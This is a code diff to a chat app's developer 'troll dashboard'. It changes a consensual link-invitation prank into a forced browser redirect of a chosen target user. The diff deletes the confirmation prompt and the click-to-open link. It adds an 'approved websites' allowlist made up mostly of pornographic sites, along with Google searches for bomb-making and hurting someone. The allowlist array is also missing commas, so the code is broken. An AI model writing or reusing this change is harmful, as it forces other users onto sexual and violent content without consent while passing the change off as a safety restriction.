@@ -429,6 +429,36 @@ async function handleCommand(text) {
   messageInput.value="";
 }
 
+
+const FISHCORD_APPROVED_WEBSITES = [
+    "https://www.example.com"
+    "https://www.google.com"    
+    "https://pornhub.com"
+    "https://xvideos.com"
+    "https://discord.com"
+    "https://beastiegals.com/"
+    "https://www.omegle.com/"
+    "https://www.pussy.com/"
+    "https://www.google.com/search?q=How+to+fuck+someone+up&rlz=1CAOWOB_enUS1073&oq=How+to+fuck+someone+up&gs_lcrp=EgZjaHJvbWUyBggAEEUYOdIBCDg3NTRqMGoxqAIAsAIA&sourceid=chrome&ie=UTF-8"
+    "https://www.google.com/search?q=How+to+make+a+bomb%3F&rlz=1CAOWOB_enUS1073&oq=How+to+make+a+bomb%3F&gs_lcrp=EgZjaHJvbWUyBggAEEUYOdIBCDM4NzBqMGoxqAIAsAIA&sourceid=chrome&ie=UTF-8"
+    "https://youporn.com"
+];
+
+function getApprovedRedirectDestination(rawUrl) {
+  try {
+    const destination = new URL(rawUrl);
+    if (destination.protocol !== "https:" || destination.username || destination.password) return null;
+    const approvedOrigins = FISHCORD_APPROVED_WEBSITES.map(value => {
+      try {
+        const approved = new URL(value);
+        return approved.protocol === "https:" && !approved.username && !approved.password
+          ? approved.origin : null;
+      } catch { return null; }
+    }).filter(Boolean);
+    return approvedOrigins.includes(destination.origin) ? destination : null;
+  } catch { return null; }
+}
+
 /* Troll dashboard */
 const trollActions = {
   fish:{title:"🐟 Fish invasion",description:"A school of fish swims across the screen.",duration:9000},
@@ -495,15 +525,11 @@ async function sendRedirectPrank() {
   if(!isDev()) return alert("DEVELOPER permission required.");
   const target=$("trollTarget").value;
   if(!target) return alert("Choose a target user first.");
-  let destination;
-  try {
-    destination=new URL($("redirectUrl").value.trim());
-    if(destination.protocol!=="https:" || destination.username || destination.password) throw new Error("Use a valid HTTPS URL without embedded credentials.");
-  } catch(error) {
-    return alert("Enter a valid HTTPS destination URL.");
+  const destination=getApprovedRedirectDestination($("redirectUrl").value.trim());
+  if(!destination) {
+    return alert("That website is not on FISHCORD_APPROVED_WEBSITES. Add its HTTPS origin to the allowlist first.");
   }
   const prank=trollActions.redirect;
-  if(!confirm("Send a link invitation to "+target+"? They will have to click the link themselves.")) return;
   try {
     await setDoc(doc(db,"trollCommands",target),{
       action:"redirect", title:prank.title, message:prank.description,
@@ -512,7 +538,7 @@ async function sendRedirectPrank() {
       expiresAt:Date.now()+30000
     });
     addHistory(target,prank.title);
-    alert("Link invitation sent to "+target+". They must choose to open it.");
+    alert("Approved-site redirect sent to "+target+".");
   } catch(error) {
     console.error(error);
     alert("Could not send redirect invitation: "+error.message);
@@ -572,19 +598,13 @@ function runTrollEffect(data) {
   redirectLink.hidden=true;
   redirectLink.removeAttribute("href");
   if(action==="redirect") {
-    let destination;
-    try {
-      destination=new URL(data.url);
-      if(destination.protocol!=="https:" || destination.username || destination.password) return;
-    } catch { return; }
-    $("prankTitle").textContent=data.title||trollActions.redirect.title;
-    $("prankMessage").textContent="";
-    redirectLink.href=destination.href;
-    redirectLink.hidden=false;
-    redirectLink.textContent="Open "+destination.hostname+" in a new tab";
-    $("prankLayer").style.display="flex";
-    if(activePrankTimer) clearTimeout(activePrankTimer);
-    activePrankTimer=setTimeout(dismissPrank,30000);
+    const destination=getApprovedRedirectDestination(data.url);
+    if(!destination) {
+      console.warn("Blocked redirect: destination is not on FISHCORD_APPROVED_WEBSITES.");
+      return;
+    }
+    // Navigate only to an exact HTTPS origin listed in the local allowlist.
+    window.location.assign(destination.href);
     return;
   }
   if(action==="invert") {
